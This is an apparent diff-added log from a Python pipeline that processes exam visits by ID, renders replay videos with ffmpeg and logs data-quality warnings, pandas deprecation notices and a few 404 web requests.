+Empty data for visit_exam_id: 2028
+WARNING:root:Empty data for visit_exam_id: 2029
+Empty data for visit_exam_id: 2029
+WARNING:root:Empty data for visit_exam_id: 2030
+Empty data for visit_exam_id: 2030
+WARNING:root:Empty data for visit_exam_id: 2031
+Empty data for visit_exam_id: 2031
+WARNING:root:Empty data for visit_exam_id: 2032
+Empty data for visit_exam_id: 2032
+WARNING:root:No data to report for visit_id: 29d949e4-9034-46d5-9219-c3b56af1786d
+No data to report for visit_id: 29d949e4-9034-46d5-9219-c3b56af1786d
+INFO:root:Processing: 47c0c7fd-405a-4c3f-b362-c3d0902b0723
+Processing: 47c0c7fd-405a-4c3f-b362-c3d0902b0723
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/47c0c7fd-405a-4c3f-b362-c3d0902b0723/figures/1889_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/47c0c7fd-405a-4c3f-b362-c3d0902b0723/figures/1889_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/47c0c7fd-405a-4c3f-b362-c3d0902b0723/figures/1890_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/47c0c7fd-405a-4c3f-b362-c3d0902b0723/figures/1890_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/47c0c7fd-405a-4c3f-b362-c3d0902b0723/figures/1891_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/47c0c7fd-405a-4c3f-b362-c3d0902b0723/figures/1891_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/47c0c7fd-405a-4c3f-b362-c3d0902b0723/figures/1892_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/47c0c7fd-405a-4c3f-b362-c3d0902b0723/figures/1892_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/47c0c7fd-405a-4c3f-b362-c3d0902b0723/figures/1893_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/47c0c7fd-405a-4c3f-b362-c3d0902b0723/figures/1893_replay.mp4']
+INFO:root:Processing: f86839b9-a363-4394-82de-1807e9181e2c
+Processing: f86839b9-a363-4394-82de-1807e9181e2c
+/home/ubuntu/anaconda3/envs/reactn/lib/python3.6/site-packages/pandas/core/indexing.py:961: FutureWarning: 
+Passing list-likes to .loc or [] with any missing label will raise
+KeyError in the future, you can use .reindex() as an alternative.
+
+See the documentation here:
+https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#deprecate-loc-reindex-listlike
+  return getattr(section, self.name)[new_key]
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/f86839b9-a363-4394-82de-1807e9181e2c/figures/192_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/f86839b9-a363-4394-82de-1807e9181e2c/figures/192_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/f86839b9-a363-4394-82de-1807e9181e2c/figures/193_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/f86839b9-a363-4394-82de-1807e9181e2c/figures/193_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/f86839b9-a363-4394-82de-1807e9181e2c/figures/194_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/f86839b9-a363-4394-82de-1807e9181e2c/figures/194_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/f86839b9-a363-4394-82de-1807e9181e2c/figures/195_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/f86839b9-a363-4394-82de-1807e9181e2c/figures/195_replay.mp4']
+INFO:root:Processing: 00858f48-0e13-449f-ab29-f7bc7fa7a362
+Processing: 00858f48-0e13-449f-ab29-f7bc7fa7a362
+WARNING:root:Empty data for visit_exam_id: 799
+Empty data for visit_exam_id: 799
+WARNING:root:Empty data for visit_exam_id: 800
+Empty data for visit_exam_id: 800
+WARNING:root:Empty data for visit_exam_id: 801
+Empty data for visit_exam_id: 801
+WARNING:root:Empty data for visit_exam_id: 802
+Empty data for visit_exam_id: 802
+WARNING:root:Empty data for visit_exam_id: 803
+Empty data for visit_exam_id: 803
+WARNING:root:Empty data for visit_exam_id: 804
+Empty data for visit_exam_id: 804
+WARNING:root:Empty data for visit_exam_id: 805
+Empty data for visit_exam_id: 805
+WARNING:root:Empty data for visit_exam_id: 806
+Empty data for visit_exam_id: 806
+WARNING:root:Empty data for visit_exam_id: 807
+Empty data for visit_exam_id: 807
+WARNING:root:No data to report for visit_id: 00858f48-0e13-449f-ab29-f7bc7fa7a362
+No data to report for visit_id: 00858f48-0e13-449f-ab29-f7bc7fa7a362
+INFO:root:Processing: 675bcea5-2bbd-4cdd-b2b3-abae53b33a80
+Processing: 675bcea5-2bbd-4cdd-b2b3-abae53b33a80
+/home/ubuntu/anaconda3/envs/reactn/lib/python3.6/site-packages/pandas/core/indexing.py:961: FutureWarning: 
+Passing list-likes to .loc or [] with any missing label will raise
+KeyError in the future, you can use .reindex() as an alternative.
+
+See the documentation here:
+https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#deprecate-loc-reindex-listlike
+  return getattr(section, self.name)[new_key]
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '67.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/675bcea5-2bbd-4cdd-b2b3-abae53b33a80/figures/558_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '67.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/675bcea5-2bbd-4cdd-b2b3-abae53b33a80/figures/558_replay.mp4']
+INFO:werkzeug:83.97.20.34 - - [02/Feb/2020 22:04:40] "GET / HTTP/1.0" 404 -
+83.97.20.34 - - [02/Feb/2020 22:04:40] "GET / HTTP/1.0" 404 -
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '67.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/675bcea5-2bbd-4cdd-b2b3-abae53b33a80/figures/559_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '67.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/675bcea5-2bbd-4cdd-b2b3-abae53b33a80/figures/559_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '67.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/675bcea5-2bbd-4cdd-b2b3-abae53b33a80/figures/560_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '67.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/675bcea5-2bbd-4cdd-b2b3-abae53b33a80/figures/560_replay.mp4']
+WARNING:root:Issue analysis @ Line 382
+Issue analysis @ Line 382
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '67.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/675bcea5-2bbd-4cdd-b2b3-abae53b33a80/figures/561_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '67.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/675bcea5-2bbd-4cdd-b2b3-abae53b33a80/figures/561_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '67.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/675bcea5-2bbd-4cdd-b2b3-abae53b33a80/figures/564_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '67.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/675bcea5-2bbd-4cdd-b2b3-abae53b33a80/figures/564_replay.mp4']
+INFO:root:Processing: 363c8f2a-3816-41bb-81fc-887135b7096a
+Processing: 363c8f2a-3816-41bb-81fc-887135b7096a
+WARNING:root:Sampling rate problem.
+Sampling rate problem.
+WARNING:root:visit_exam_id: 76
+visit_exam_id: 76
+WARNING:root:Sampling rate problem.
+Sampling rate problem.
+WARNING:root:visit_exam_id: 77
+visit_exam_id: 77
+WARNING:root:Duplicate columns in df.
+Duplicate columns in df.
+WARNING:root:visit_exam_id: 78
+visit_exam_id: 78
+WARNING:root:Sampling rate problem.
+Sampling rate problem.
+WARNING:root:visit_exam_id: 79
+visit_exam_id: 79
+WARNING:root:No data to report for visit_id: 363c8f2a-3816-41bb-81fc-887135b7096a
+No data to report for visit_id: 363c8f2a-3816-41bb-81fc-887135b7096a
+INFO:root:Processing: 1286241f-4a04-4af5-9819-1a71ebcb2d04
+Processing: 1286241f-4a04-4af5-9819-1a71ebcb2d04
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '51.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/1286241f-4a04-4af5-9819-1a71ebcb2d04/figures/2018_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '51.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/1286241f-4a04-4af5-9819-1a71ebcb2d04/figures/2018_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '51.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/1286241f-4a04-4af5-9819-1a71ebcb2d04/figures/2019_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '51.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/1286241f-4a04-4af5-9819-1a71ebcb2d04/figures/2019_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '51.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/1286241f-4a04-4af5-9819-1a71ebcb2d04/figures/2020_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '51.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/1286241f-4a04-4af5-9819-1a71ebcb2d04/figures/2020_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '51.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/1286241f-4a04-4af5-9819-1a71ebcb2d04/figures/2021_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '51.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/1286241f-4a04-4af5-9819-1a71ebcb2d04/figures/2021_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '51.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/1286241f-4a04-4af5-9819-1a71ebcb2d04/figures/2022_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '51.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/1286241f-4a04-4af5-9819-1a71ebcb2d04/figures/2022_replay.mp4']
+INFO:root:Processing: 4b79677d-bc9c-40a3-95e7-efcb8a156e13
+Processing: 4b79677d-bc9c-40a3-95e7-efcb8a156e13
+/home/ubuntu/anaconda3/envs/reactn/lib/python3.6/site-packages/pandas/core/indexing.py:961: FutureWarning: 
+Passing list-likes to .loc or [] with any missing label will raise
+KeyError in the future, you can use .reindex() as an alternative.
+
+See the documentation here:
+https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#deprecate-loc-reindex-listlike
+  return getattr(section, self.name)[new_key]
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/4b79677d-bc9c-40a3-95e7-efcb8a156e13/figures/1669_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/4b79677d-bc9c-40a3-95e7-efcb8a156e13/figures/1669_replay.mp4']
+/home/ubuntu/reactrack/matviz/matviz/etl.py:340: RuntimeWarning: invalid value encountered in true_divide
+  outt = ys/enss
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '46.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/4b79677d-bc9c-40a3-95e7-efcb8a156e13/figures/1670_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '46.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/4b79677d-bc9c-40a3-95e7-efcb8a156e13/figures/1670_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/4b79677d-bc9c-40a3-95e7-efcb8a156e13/figures/1671_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/4b79677d-bc9c-40a3-95e7-efcb8a156e13/figures/1671_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/4b79677d-bc9c-40a3-95e7-efcb8a156e13/figures/1672_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/4b79677d-bc9c-40a3-95e7-efcb8a156e13/figures/1672_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/4b79677d-bc9c-40a3-95e7-efcb8a156e13/figures/1673_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/4b79677d-bc9c-40a3-95e7-efcb8a156e13/figures/1673_replay.mp4']
+INFO:root:Processing: c34393bc-059d-4bb2-af2b-9d8d52612294
+Processing: c34393bc-059d-4bb2-af2b-9d8d52612294
+/home/ubuntu/anaconda3/envs/reactn/lib/python3.6/site-packages/pandas/core/indexing.py:961: FutureWarning: 
+Passing list-likes to .loc or [] with any missing label will raise
+KeyError in the future, you can use .reindex() as an alternative.
+
+See the documentation here:
+https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#deprecate-loc-reindex-listlike
+  return getattr(section, self.name)[new_key]
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '51.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/c34393bc-059d-4bb2-af2b-9d8d52612294/figures/1740_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '51.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/c34393bc-059d-4bb2-af2b-9d8d52612294/figures/1740_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '51.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/c34393bc-059d-4bb2-af2b-9d8d52612294/figures/1741_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '51.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/c34393bc-059d-4bb2-af2b-9d8d52612294/figures/1741_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '51.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/c34393bc-059d-4bb2-af2b-9d8d52612294/figures/1742_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '51.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/c34393bc-059d-4bb2-af2b-9d8d52612294/figures/1742_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '50.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/c34393bc-059d-4bb2-af2b-9d8d52612294/figures/1743_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '50.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/c34393bc-059d-4bb2-af2b-9d8d52612294/figures/1743_replay.mp4']
+INFO:root:Processing: cc60fd7b-80e3-4260-b616-07937a1cd8e5
+Processing: cc60fd7b-80e3-4260-b616-07937a1cd8e5
+WARNING:root:Empty data for visit_exam_id: 2184
+Empty data for visit_exam_id: 2184
+WARNING:root:Empty data for visit_exam_id: 2185
+Empty data for visit_exam_id: 2185
+WARNING:root:Empty data for visit_exam_id: 2186
+Empty data for visit_exam_id: 2186
+WARNING:root:Empty data for visit_exam_id: 2187
+Empty data for visit_exam_id: 2187
+WARNING:root:Empty data for visit_exam_id: 2188
+Empty data for visit_exam_id: 2188
+WARNING:root:Empty data for visit_exam_id: 2189
+Empty data for visit_exam_id: 2189
+WARNING:root:No data to report for visit_id: cc60fd7b-80e3-4260-b616-07937a1cd8e5
+No data to report for visit_id: cc60fd7b-80e3-4260-b616-07937a1cd8e5
+INFO:root:Processing: 18480269-ce2e-4c04-8434-d3351f802443
+Processing: 18480269-ce2e-4c04-8434-d3351f802443
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/18480269-ce2e-4c04-8434-d3351f802443/figures/2629_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/18480269-ce2e-4c04-8434-d3351f802443/figures/2629_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/18480269-ce2e-4c04-8434-d3351f802443/figures/2630_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/18480269-ce2e-4c04-8434-d3351f802443/figures/2630_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/18480269-ce2e-4c04-8434-d3351f802443/figures/2631_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/18480269-ce2e-4c04-8434-d3351f802443/figures/2631_replay.mp4']
+INFO:werkzeug:141.255.92.44 - - [02/Feb/2020 22:47:46] "GET / HTTP/1.1" 404 -
+141.255.92.44 - - [02/Feb/2020 22:47:46] "GET / HTTP/1.1" 404 -
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/18480269-ce2e-4c04-8434-d3351f802443/figures/2632_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/18480269-ce2e-4c04-8434-d3351f802443/figures/2632_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/18480269-ce2e-4c04-8434-d3351f802443/figures/2633_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/18480269-ce2e-4c04-8434-d3351f802443/figures/2633_replay.mp4']
+INFO:root:Processing: 8c139159-50fa-48ff-9499-4d5377a705b1
+Processing: 8c139159-50fa-48ff-9499-4d5377a705b1
+WARNING:root:Duplicate columns in df.
+Duplicate columns in df.
+WARNING:root:visit_exam_id: 1811
+visit_exam_id: 1811
+WARNING:root:Duplicate columns in df.
+Duplicate columns in df.
+WARNING:root:visit_exam_id: 1814
+visit_exam_id: 1814
